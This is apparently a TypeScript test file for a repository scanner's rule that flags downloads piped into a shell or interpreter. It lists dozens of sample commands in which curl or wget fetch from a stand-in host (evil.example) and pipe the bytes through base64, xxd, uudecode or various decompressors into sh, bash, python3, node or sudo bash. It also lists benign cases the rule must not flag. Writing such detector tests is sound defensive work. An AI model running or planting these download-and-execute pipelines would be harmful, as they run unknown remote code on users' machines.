import { expect, test } from "bun:test";
import { inspectRepository } from "./bounded-scan";

/**
 * PRD section 8 requires the bounded malicious-code scan to flag unsafe
 * execution. A download piped through a decoder into a shell or
 * interpreter runs the downloaded bytes, decoded; the decode spellings
 * a plainly written decode flag does not cover are tested here.
 */
function inspected(path: string, text: string) {
  return inspectRepository({
    files: [{ path, bytes: new TextEncoder().encode(text) }],
  });
}

function categories(inspection: ReturnType<typeof inspected>) {
  return inspection.findings.map(
    (finding) => `${finding.path}:${finding.category}:${finding.severity}`,
  );
}

const DECODE_PIPES: Record<string, string> = {
  "base64 -di into sh": "curl -s https://evil.example/x.b64 | base64 -di | sh",
  "base64 -id into sh": "curl -s https://evil.example/x.b64 | base64 -id | sh",
  "base64 -id into python3":
    "wget -qO- https://evil.example/x.b64 | base64 -id | python3",
  "base64 -di into sudo bash":
    "curl -s https://evil.example/x.b64 | base64 -di | sudo bash",
  "xxd -r -p into sh": "curl -s https://evil.example/x.hex | xxd -r -p | sh",
  "xxd -p -r into bash":
    "curl -s https://evil.example/x.hex | xxd -p -r | bash",
  "xxd -r into node": "curl -s https://evil.example/x.hex | xxd -r | node",
  "uudecode to stdout into sh":
    "curl -s https://evil.example/x.uu | uudecode -o /dev/stdout | sh",
};

test("a download piped through a decoder into an executor is unsafe execution", () => {
  for (const [name, body] of Object.entries(DECODE_PIPES)) {
    const inspection = inspected("install.sh", `#!/bin/sh\n${body}\n`);
    expect({ name, findings: categories(inspection) }).toEqual({
      name,
      findings: ["install.sh:unsafe-execution:high"],
    });
  }
});

const COMPRESSED_PIPES: Record<string, string> = {
  "gunzip into sh": "curl -s https://evil.example/x.gz | gunzip | sh",
  "gunzip -c into sh": "curl -s https://evil.example/x.gz | gunzip -c | sh",
  "gzip -d into sh": "curl -s https://evil.example/x.gz | gzip -d | sh",
  "gzip -dc into bash": "curl -s https://evil.example/x.gz | gzip -dc | bash",
  "zcat into bash": "curl -s https://evil.example/x.gz | zcat | bash",
  "bunzip2 into sh": "curl -s https://evil.example/x.bz2 | bunzip2 | sh",
  "bzip2 -d into sh": "curl -s https://evil.example/x.bz2 | bzip2 -d | sh",
  "bzip2 -dc into sh": "curl -s https://evil.example/x.bz2 | bzip2 -dc | sh",
  "bzcat into sh": "curl -s https://evil.example/x.bz2 | bzcat | sh",
  "xz -d into sh": "curl -s https://evil.example/x.xz | xz -d | sh",
  "unxz into sh": "curl -s https://evil.example/x.xz | unxz | sh",
  "xzcat into sh": "curl -s https://evil.example/x.xz | xzcat | sh",
  "zstd -d into sh": "curl -s https://evil.example/x.zst | zstd -d | sh",
  "zstdcat into sh": "curl -s https://evil.example/x.zst | zstdcat | sh",
  "unzstd into sh": "curl -s https://evil.example/x.zst | unzstd | sh",
  "gunzip into python3":
    "wget -qO- https://evil.example/x.gz | gunzip | python3",
  "gunzip into sudo bash":
    "curl -s https://evil.example/x.gz | gunzip | sudo bash",
};

test("a download piped through a decompressor into an executor is unsafe execution", () => {
  for (const [name, body] of Object.entries(COMPRESSED_PIPES)) {
    const inspection = inspected("install.sh", `#!/bin/sh\n${body}\n`);
    expect({ name, findings: categories(inspection) }).toEqual({
      name,
      findings: ["install.sh:unsafe-execution:high"],
    });
  }
});

test("split and long-flag decompressor spellings into an executor are unsafe execution", () => {
  for (const [name, body] of Object.entries({
    // Split short flags: the decompress flag and the stdout flag are
    // separate tokens.
    "gzip -d -c into sh": "curl -s https://evil.example/x.gz | gzip -d -c | sh",
    "bzip2 -d -c into sh":
      "curl -s https://evil.example/x.bz2 | bzip2 -d -c | sh",
    "xz -d -c into sh": "curl -s https://evil.example/x.xz | xz -d -c | sh",
    "zstd -d -c into sh":
      "curl -s https://evil.example/x.zst | zstd -d -c | sh",
    // Flag clusters with quiet/force letters.
    "gzip -dcq into sh": "curl -s https://evil.example/x.gz | gzip -dcq | sh",
    "zstd -dcf into sh": "curl -s https://evil.example/x.zst | zstd -dcf | sh",
    // unzstd takes -c like gunzip, bunzip2 and unxz.
    "unzstd -c into sh": "curl -s https://evil.example/x.zst | unzstd -c | sh",
    // Long flags and stream flags on the cat forms.
    "gunzip --stdout into sh":
      "curl -s https://evil.example/x.gz | gunzip --stdout | sh",
    "xz --decompress --stdout into sh":
      "curl -s https://evil.example/x.xz | xz --decompress --stdout | sh",
    "zcat -f into sh": "curl -s https://evil.example/x.gz | zcat -f | sh",
  })) {
    const inspection = inspected("install.sh", `#!/bin/sh\n${body}\n`);
    expect({ name, findings: categories(inspection) }).toEqual({
      name,
      findings: ["install.sh:unsafe-execution:high"],
    });
  }
  for (const body of [
    // A file operand after the flags still keeps no finding.
    "curl -s https://example.com/data.gz | gzip -d file.gz | sh",
    "curl -s https://example.com/data.xz | xz --decompress file.xz | sh",
    // A compressor flag without a decompress flag compresses, not decodes.
    "curl -s https://example.com/data.gz | gzip -f | sh",
  ]) {
    const inspection = inspected("install.sh", `#!/bin/sh\n${body}\n`);
    expect({ body, findings: categories(inspection) }).toEqual({
      body,
      findings: [],
    });
  }
});

test("reviewer-reported decompressor spellings into an executor are unsafe execution", () => {
  for (const [name, body] of Object.entries({
    // A shell reading its program from stdin keeps reading it with -s
    // positional arguments, unlike the syntax-only -n target.
    "gunzip into sh -s with args":
      "curl -s https://evil.example/x.gz | gunzip | sh -s -- --yes",
    // A lone '-' operand is the stream itself, not a file operand.
    "gunzip - into sh": "curl -s https://evil.example/x.gz | gunzip - | sh",
    "zcat - into sh": "curl -s https://evil.example/x.gz | zcat - | sh",
    "gzip -dc - into sh": "curl -s https://evil.example/x.gz | gzip -dc - | sh",
    // Drop-in equivalents of the gzip/xz families.
    "pigz -dc into sh": "curl -s https://evil.example/x.gz | pigz -dc | sh",
    "unpigz into sh": "curl -s https://evil.example/x.gz | unpigz | sh",
    "unpigz -c into sh": "curl -s https://evil.example/x.gz | unpigz -c | sh",
    "lzma -d into sh": "curl -s https://evil.example/x.xz | lzma -d | sh",
    "unlzma into sh": "curl -s https://evil.example/x.xz | unlzma | sh",
    "lzcat into sh": "curl -s https://evil.example/x.xz | lzcat | sh",
    // A busybox applet prefix does not change the decompressor.
    "busybox gunzip into sh":
      "curl -s https://evil.example/x.gz | busybox gunzip | sh",
  })) {
    const inspection = inspected("install.sh", `#!/bin/sh\n${body}\n`);
    expect({ name, findings: categories(inspection) }).toEqual({
      name,
      findings: ["install.sh:unsafe-execution:high"],
    });
  }
  for (const body of [
    // A '-' followed by a file operand reads that file, not the stream.
    "curl -s https://example.com/data.gz | gunzip - local.gz | sh",
    // pigz/lzma without a decompress flag compress, not decode.
    "curl -s https://example.com/data.gz | pigz | sh",
    "curl -s https://example.com/data.xz | lzma | sh",
  ]) {
    const inspection = inspected("install.sh", `#!/bin/sh\n${body}\n`);
    expect({ body, findings: categories(inspection) }).toEqual({
      body,
      findings: [],
    });
  }
});

test("decompressors that do not hand the download to an executor keep no finding", () => {
  for (const body of [
    // The decompressor writes a file; nothing runs it here.
    "curl -s https://example.com/data.gz | gunzip > data.bin",
    // Local input operands do not execute the remote stream.
    "curl -s https://example.com/data.gz | gunzip local.gz | sh",
    // A gzip without -d compresses; the shell would read compressed bytes.
    "curl -s https://example.com/data.gz | gzip | sh",
    // A syntax-only target does not run the stream.
    "curl -s https://example.com/data.gz | gunzip | sh -n",
    // The decompressor feeds a checksum, not an executor.
    "curl -s https://example.com/data.gz | gunzip | sha256sum",
    // No download: a local file decompressed into a shell.
    "cat payload.gz | gunzip | sh",
  ]) {
    const inspection = inspected("install.sh", `#!/bin/sh\n${body}\n`);
    expect({ body, findings: categories(inspection) }).toEqual({
      body,
      findings: [],
    });
  }
});

test("decoders that do not hand the download to an executor keep no finding", () => {
  for (const body of [
    // The decoder writes a file; nothing runs it here.
    "curl -s https://example.com/data.b64 | base64 -di > decoded.bin",
    "curl -s https://example.com/data.hex | xxd -r -p > decoded.bin",
    // An xxd without -r encodes; the shell would read hex text.
    "curl -s https://example.com/data.bin | xxd | sh",
    // A uudecode without -o writes its embedded filename, not stdout.
    "curl -s https://example.com/x.uu | uudecode | sh",
    // Local input operands do not execute the remote stream.
    "curl -s https://example.com/data.hex | xxd -r -p local.hex | sh",
    "curl -s https://example.com/data.b64 | base64 -di local.b64 | sh",
    "curl -s https://example.com/data.uu | uudecode -o /dev/stdout local.uu | sh",
    // Unsupported flags or version/syntax-only targets do not run the stream.
    "curl -s https://example.com/data.b64 | base64 -qdi | sh",
    "curl -s https://example.com/data.hex | xxd -r -p | python3 -V",
    "curl -s https://example.com/data.hex | xxd -r -p | sh -n",
    // The decoder feeds a checksum, not an executor.
    "curl -s https://example.com/data.b64 | base64 -di | sha256sum",
    // No download: a local file decoded into a shell.
    "cat payload.hex | xxd -r -p | sh",
  ]) {
    const inspection = inspected("install.sh", `#!/bin/sh\n${body}\n`);
    expect({ body, findings: categories(inspection) }).toEqual({
      body,
      findings: [],
    });
  }
});
